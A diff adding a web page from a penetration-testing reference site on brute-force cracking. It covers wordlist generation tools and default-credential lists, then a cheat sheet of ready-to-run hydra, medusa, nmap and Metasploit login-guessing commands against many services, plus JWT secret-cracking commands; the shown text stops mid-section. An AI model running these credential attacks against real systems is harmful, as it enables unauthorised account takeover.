@@ -1,0 +1,2027 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Tips and tricks for creating wordlists, finding default credentials, brute-force tools cheatsheets, etc..">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Brute Force Cracking" />
+<meta property="og:description" content="Tips and tricks for creating wordlists, finding default credentials, brute-force tools cheatsheets, etc.." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/brute_force_cracking/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2023-01-15T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-01-15T00:00:00+00:00" />
+<title>Brute Force Cracking | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.98392d4a73ac625d0a3c8053760e4f49534c3f8d05620dc558582b34f6a96093.js" integrity="sha256-mDktSnOsYl0KPIBTdg5PSVNMP40FYg3FWFgrNPapYJM=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();
+   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(90832071, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/90832071" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894"
+     crossorigin="anonymous"></script>
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/brute_force_cracking/" class="active">Brute Force Cracking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/training_grounds/" class="">Training Grounds</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Brute Force Cracking</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#brute-force-cracking">Brute Force Cracking</a>
+      <ul>
+        <li><a href="#making-wordslists">Making wordslists</a>
+          <ul>
+            <li><a href="#crunch">Crunch</a></li>
+            <li><a href="#cewl">Cewl</a></li>
+            <li><a href="#cupp">CUPP</a></li>
+            <li><a href="#pydictor">pydictor</a></li>
+            <li><a href="#wordlists">Wordlists</a></li>
+          </ul>
+        </li>
+        <li><a href="#default-credentials">Default Credentials</a></li>
+        <li><a href="#brute-force-cheatsheeet">Brute Force Cheatsheeet</a>
+          <ul>
+            <li><a href="#services">Services</a></li>
+            <li><a href="#afp">AFP</a></li>
+            <li><a href="#ajp">AJP</a></li>
+            <li><a href="#cassandra">Cassandra</a></li>
+            <li><a href="#couchdb">CouchDB</a></li>
+            <li><a href="#docker-registry">Docker Registry</a></li>
+            <li><a href="#elasticsearch">Elasticsearch</a></li>
+            <li><a href="#ftp">FTP</a></li>
+            <li><a href="#http-generic-brute">HTTP Generic Brute</a></li>
+            <li><a href="#http-basic-auth">HTTP Basic Auth</a></li>
+            <li><a href="#http---post-form">HTTP - Post Form</a></li>
+            <li><a href="#http---cms----wordpress-joomla-or-drupal-or-moodle">HTTP - CMS &ndash; (W)ordpress, (J)oomla or (D)rupal or (M)oodle</a></li>
+            <li><a href="#imap">IMAP</a></li>
+            <li><a href="#irc">IRC</a></li>
+            <li><a href="#iscsi">ISCSI</a></li>
+            <li><a href="#jwt">JWT</a></li>
+            <li><a href="#ldap">LDAP</a></li>
+            <li><a href="#mqtt">MQTT</a></li>
+            <li><a href="#mongo">Mongo</a></li>
+            <li><a href="#mysql">MySQL</a></li>
+            <li><a href="#oraclesql">OracleSQL</a></li>
+            <li><a href="#pop">POP</a></li>
+            <li><a href="#postgresql">PostgreSQL</a></li>
+            <li><a href="#pptp">PPTP</a></li>
+            <li><a href="#rdp">RDP</a></li>
+            <li><a href="#redis">Redis</a></li>
+            <li><a href="#rexec">Rexec</a></li>
+            <li><a href="#rlogin">Rlogin</a></li>
+            <li><a href="#rsh">Rsh</a></li>
+            <li><a href="#rsync">Rsync</a></li>
+            <li><a href="#rtsp">RTSP</a></li>
+            <li><a href="#snmp">SNMP</a></li>
+            <li><a href="#smb">SMB</a></li>
+            <li><a href="#smtp">SMTP</a></li>
+            <li><a href="#socks">SOCKS</a></li>
+            <li><a href="#sql-server">SQL Server</a></li>
+            <li><a href="#ssh">SSH</a></li>
+            <li><a href="#telnet">Telnet</a></li>
+            <li><a href="#vnc">VNC</a></li>
+            <li><a href="#winrm">Winrm</a></li>
+          </ul>
+        </li>
+        <li><a href="#cracking-locally">Cracking Locally</a>
+          <ul>
+            <li><a href="#online-cracking-databases">Online cracking databases</a></li>
+            <li><a href="#zip">ZIP</a></li>
+            <li><a href="#7z">7z</a></li>
+            <li><a href="#pdf">PDF</a></li>
+            <li><a href="#pdf-owner-password">PDF Owner Password</a></li>
+            <li><a href="#jwt-1">JWT</a></li>
+            <li><a href="#ntlm-cracking">NTLM cracking</a></li>
+            <li><a href="#keepass">Keepass</a></li>
+            <li><a href="#keberoasting">Keberoasting</a></li>
+            <li><a href="#lucks-image">Lucks image</a></li>
+            <li><a href="#mysql-1">Mysql</a></li>
+            <li><a href="#dpapi-master-key">DPAPI Master Key</a></li>
+            <li><a href="#open-office-pwd-protected-column">Open Office Pwd Protected Column</a></li>
+            <li><a href="#pfx-certificates">PFX Certificates</a></li>
+          </ul>
+        </li>
+        <li><a href="#tools">Tools</a>
+          <ul>
+            <li><a href="#hash-identifier">Hash-identifier</a></li>
+            <li><a href="#wordlists-1">Wordlists</a></li>
+            <li><a href="#wordlist-generation-tools">Wordlist Generation Tools</a></li>
+            <li><a href="#john-mutation">John mutation</a></li>
+            <li><a href="#hashcat">Hashcat</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="brute-force-cracking">
+  Brute Force Cracking
+  <a class="anchor" href="#brute-force-cracking">#</a>
+</h1>
+<h2 id="making-wordslists">
+  Making wordslists
+  <a class="anchor" href="#making-wordslists">#</a>
+</h2>
+<p>Find as much information about the target as you can and generate a custom dictionary. Tools that may help:</p>
+<h3 id="crunch">
+  Crunch
+  <a class="anchor" href="#crunch">#</a>
+</h3>
+<pre tabindex="0"><code>crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
+crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)
+
+@ Lower case alpha characters
+, Upper case alpha characters
+% Numeric characters
+^ Special characters including spac
+crunch 6 8 -t ,@@^^%%
+</code></pre><h3 id="cewl">
+  Cewl
+  <a class="anchor" href="#cewl">#</a>
+</h3>
+<pre tabindex="0"><code>cewl example.com -m 5 -w words.txt
+</code></pre><h3 id="cupp">
+  CUPP
+  <a class="anchor" href="#cupp">#</a>
+</h3>
+<p>Generate passwords based on your knowledge of the victim (names, dates&hellip;)
+<code>python3 cupp.py -h</code></p>
+<h3 id="pydictor">
+  pydictor
+  <a class="anchor" href="#pydictor">#</a>
+</h3>
+<h3 id="wordlists">
+  Wordlists
+  <a class="anchor" href="#wordlists">#</a>
+</h3>
+<p><a href="https://github.com/danielmiessler/SecLists">SecLists</a>
+<a href="https://github.com/Dormidera/WordList-Compendium">WordList-Compendium</a>
+<a href="https://github.com/kaonashi-passwords/Kaonashi">Kaonashi</a>
+(<a href="https://github.com/google/fuzzing/tree/master/dictionaries">https://github.com/google/fuzzing/tree/master/dictionaries</a>)
+(<a href="https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm">https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm</a>)</p>
+<h2 id="default-credentials">
+  Default Credentials
+  <a class="anchor" href="#default-credentials">#</a>
+</h2>
+<ul>
+<li>(<a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a>)</li>
+<li>(<a href="http://www.phenoelit.org/dpl/dpl.html">http://www.phenoelit.org/dpl/dpl.html</a>)</li>
+<li>(<a href="http://www.vulnerabilityassessment.co.uk/passwordsC.htm">http://www.vulnerabilityassessment.co.uk/passwordsC.htm</a>)</li>
+<li>(<a href="https://192-168-1-1ip.mobi/default-router-passwords-list/">https://192-168-1-1ip.mobi/default-router-passwords-list/</a>)</li>
+<li>(<a href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a>)</li>
+<li>(<a href="https://bizuns.com/default-passwords-list">https://bizuns.com/default-passwords-list</a>)</li>
+<li>(<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv</a>)</li>
+<li>(<a href="https://github.com/Dormidera/WordList-Compendium">https://github.com/Dormidera/WordList-Compendium</a>)</li>
+<li>(<a href="https://www.cirt.net/passwords">https://www.cirt.net/passwords</a>)</li>
+<li>(<a href="http://www.passwordsdatabase.com/">http://www.passwordsdatabase.com/</a>)</li>
+<li>(<a href="https://many-passwords.github.io/">https://many-passwords.github.io/</a>)</li>
+</ul>
+<h2 id="brute-force-cheatsheeet">
+  Brute Force Cheatsheeet
+  <a class="anchor" href="#brute-force-cheatsheeet">#</a>
+</h2>
+<h3 id="services">
+  Services
+  <a class="anchor" href="#services">#</a>
+</h3>
+<h3 id="afp">
+  AFP
+  <a class="anchor" href="#afp">#</a>
+</h3>
+<pre tabindex="0"><code>nmap -p 548 --script afp-brute &lt;IP&gt;
+msf&gt; use auxiliary/scanner/afp/afp_login
+msf&gt; set BLANK_PASSWORDS true
+msf&gt; set USER_AS_PASS true
+msf&gt; set PASS_FILE &lt;PATH_PASSWDS&gt;
+msf&gt; set USER_FILE &lt;PATH_USERS&gt;
+msf&gt; run
+</code></pre><h3 id="ajp">
+  AJP
+  <a class="anchor" href="#ajp">#</a>
+</h3>
+<pre tabindex="0"><code>nmap --script ajp-brute -p 8009 &lt;IP&gt;
+</code></pre><h3 id="cassandra">
+  Cassandra
+  <a class="anchor" href="#cassandra">#</a>
+</h3>
+<pre tabindex="0"><code>nmap --script cassandra-brute -p 9160 &lt;IP&gt;
+</code></pre><h3 id="couchdb">
+  CouchDB
+  <a class="anchor" href="#couchdb">#</a>
+</h3>
+<pre tabindex="0"><code>msf&gt; use auxiliary/scanner/couchdb/couchdb_login
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
+</code></pre><h3 id="docker-registry">
+  Docker Registry
+  <a class="anchor" href="#docker-registry">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
+</code></pre><h3 id="elasticsearch">
+  Elasticsearch
+  <a class="anchor" href="#elasticsearch">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
+</code></pre><h3 id="ftp">
+  FTP
+  <a class="anchor" href="#ftp">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp
+ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp
+</code></pre><h3 id="http-generic-brute">
+  HTTP Generic Brute
+  <a class="anchor" href="#http-generic-brute">#</a>
+</h3>
+<p>WFuzz</p>
+<h3 id="http-basic-auth">
+  HTTP Basic Auth
+  <a class="anchor" href="#http-basic-auth">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
+# Use https-get mode for https
+medusa -h &lt;IP&gt; -u &lt;username&gt; -P  &lt;passwords.txt&gt; -M  http -m DIR:/path/to/auth -T 10
+</code></pre><h3 id="http---post-form">
+  HTTP - Post Form
+  <a class="anchor" href="#http---post-form">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form &#34;/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect&#34; -V
+# Use https-post-form mode for https
+For https you have to change from &#34;http-post-form&#34; to &#34;https-post-form&#34;
+</code></pre><h3 id="http---cms----wordpress-joomla-or-drupal-or-moodle">
+  HTTP - CMS &ndash; (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+  <a class="anchor" href="#http---cms----wordpress-joomla-or-drupal-or-moodle">#</a>
+</h3>
+<pre tabindex="0"><code>cmsmap -f W/J/D/M -u a -p a https://wordpress.com
+</code></pre><h3 id="imap">
+  IMAP
+  <a class="anchor" href="#imap">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; imap -V
+hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f &lt;IP&gt; imap -V
+nmap -sV --script imap-brute -p &lt;PORT&gt; &lt;IP&gt;
+</code></pre><h3 id="irc">
+  IRC
+  <a class="anchor" href="#irc">#</a>
+</h3>
+<pre tabindex="0"><code>nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p &lt;PORT&gt; &lt;IP&gt;
+</code></pre><h3 id="iscsi">
+  ISCSI
+  <a class="anchor" href="#iscsi">#</a>
+</h3>
+<pre tabindex="0"><code>nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 &lt;IP&gt;
+</code></pre><h3 id="jwt">
+  JWT
+  <a class="anchor" href="#jwt">#</a>
+</h3>
+<pre tabindex="0"><code>#hashcat
+hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
+
+#https://github.com/Sjord/jwtcrack
+python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+
+#John
+john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
+
+#https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py -d wordlists.txt &lt;JWT token&gt;
+
+#https://github.com/brendan-rius/c-jwt-cracker
+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8
+
+#https://github.com/mazen160/jwt-pwn
